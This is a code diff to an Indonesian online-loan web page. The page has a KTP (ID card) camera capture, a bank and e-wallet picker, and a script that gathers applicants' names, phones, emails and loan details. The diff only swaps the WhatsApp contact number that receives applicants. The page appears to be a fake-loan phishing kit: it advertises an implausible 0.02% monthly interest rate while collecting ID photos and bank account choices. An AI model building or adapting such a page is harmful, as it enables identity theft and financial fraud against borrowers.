@@ -213,7 +213,7 @@ input[type=range]{width:100%;accent-color:var(--red)}.range-info{display:flex;ju
 <div class="cam" id="cam"><div class="cam-card"><div style="padding:12px;display:flex;justify-content:space-between;font-weight:700">Kamera KTP <span onclick="closeCam()" style="cursor:pointer">✕</span></div><video id="video" autoplay playsinline></video><canvas id="canvas" style="display:none"></canvas><div style="padding:12px;display:flex;gap:10px"><button style="flex:1;padding:11px;border-radius:30px;border:none;background:#eef0f5" onclick="closeCam()">Batal</button><button style="flex:1;padding:11px;border-radius:30px;border:none;background:#8236E1;color:#fff" onclick="ambilFoto()">Ambil</button></div></div></div>
 <div class="overlay" id="overlayBank" onclick="if(event.target==this)this.classList.remove('show')"><div class="sheet"><h3 style="padding:10px">Pilih Bank</h3><div class="bank-item" onclick="pickBank('BCA')">BCA <span>›</span></div><div class="bank-item" onclick="pickBank('BRI')">BRI <span>›</span></div><div class="bank-item" onclick="pickBank('BNI')">BNI <span>›</span></div><div class="bank-item" onclick="pickBank('MANDIRI')">MANDIRI <span>›</span></div><div class="bank-item" onclick="pickBank('BSI')">BSI <span>›</span></div><div class="bank-item" onclick="pickBank('BANK JAGO')">BANK JAGO <span>›</span></div><div class="bank-item" onclick="pickBank('SEABANK')">SEABANK <span>›</span></div><div class="bank-item" onclick="pickBank('DANA')">DANA <span>›</span></div><div class="bank-item" onclick="pickBank('OVO')">OVO <span>›</span></div><div class="bank-item" onclick="pickBank('GOPAY')">GOPAY <span>›</span></div></div></div>
 <input type="file" id="fileFoto" accept="image/*" hidden>
-<a class="wa" href="https://wa.me/6283125896726" target="_blank"><img src="https://images.icon-icons.com/2657/PNG/256/whatsapp_icon_161055.png"></a>
+<a class="wa" href="https://wa.me/6287891430958" target="_blank"><img src="https://images.icon-icons.com/2657/PNG/256/whatsapp_icon_161055.png"></a>
 <script>
 // INI YANG BIKIN TOMBOL BISA DIPENCET
 let DATA={utama:{},ktp:{},rekening:{}};
@@ -226,7 +226,7 @@ try {
     if(prev){const sim=prev.simulasi||prev.dataPinjaman||prev.pinjamanData||{};DATA.utama={...(DATA.utama||{}),nama:prev.nama||prev.namaLengkap||prev.name||DATA.utama?.nama||'',hp:prev.hp||prev.nomorHP||prev.noWhatsapp||prev.nomorWA||prev.whatsapp||DATA.utama?.hp||'',email:prev.email||DATA.utama?.email||'',pinjaman:prev.pinjaman||prev.jumlahPinjaman||sim.pinjaman||sim.jumlahPinjaman||DATA.utama?.pinjaman||'',pinjaman_angka:prev.pinjaman_angka||prev.jumlah||prev.jumlahPinjamanAngka||sim.jumlah||sim.pinjaman_angka||DATA.utama?.pinjaman_angka||'',tenor:prev.tenor||sim.tenor||DATA.utama?.tenor||'',cicilan:prev.cicilan||prev.estimasiCicilan||sim.cicilan||sim.estimasiCicilan||DATA.utama?.cicilan||'',bunga:prev.bunga||prev.estimasiBunga||sim.bunga||sim.estimasiBunga||DATA.utama?.bunga||'',bunga_rate:prev.bunga_rate||sim.bunga_rate||'0,02% per bulan',total:prev.total||prev.totalEstimasi||sim.total||sim.totalEstimasi||DATA.utama?.total||''};simpanData();}
   }
 } catch(e) {}
-const WA_NUMBER="6283125896726";
+const WA_NUMBER="6287891430958";
 function showPage(n){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));const target=document.getElementById('page'+n);if(!target){alert('Halaman tidak ditemukan.');return;}target.classList.add('active');window.scrollTo(0,0);}
 function rupiah(n){return new Intl.NumberFormat('id-ID',{style:'currency',currency:'IDR',maximumFractionDigits:0}).format(n)}
 
